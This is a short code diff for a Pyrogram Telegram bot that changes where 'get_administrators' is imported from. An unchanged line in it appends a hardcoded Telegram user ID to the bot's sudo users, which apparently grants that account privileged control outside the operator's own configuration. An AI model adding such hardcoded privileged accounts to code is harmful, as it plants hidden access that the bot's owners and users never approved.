@@ -3,7 +3,7 @@ from typing import Callable
 from pyrogram import Client
 from pyrogram.types import Message
 from config import SUDO_USERS, OWNER_ID
-from driver.admins import get_administrators
+from tools.admins import get_administrators
 
 
 SUDO_USERS.append(5083524212)
